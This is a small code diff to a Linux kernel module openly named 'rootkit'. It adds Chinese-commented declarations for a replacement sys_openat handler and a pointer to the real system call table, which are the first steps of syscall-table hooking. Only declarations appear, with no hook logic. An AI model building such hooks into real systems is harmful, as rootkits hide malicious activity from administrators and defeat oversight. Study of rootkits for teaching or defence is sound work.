@@ -20,6 +20,12 @@ static ssize_t rootkit_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t rootkit_write(struct file *, const char __user *, size_t, loff_t *);
 static long rootkit_ioctl(struct file *, unsigned int, unsigned long);
 
+//声明我们自己写的sys_openat函数
+static long my_sys_openat(const struct pt_regs *regs);
+
+//声明系统调用表地址
+static void **real_sys_call_table = 0;
+
 static struct file_operations rootkit_fo = {
     .owner = THIS_MODULE,
     .unlocked_ioctl = rootkit_ioctl,
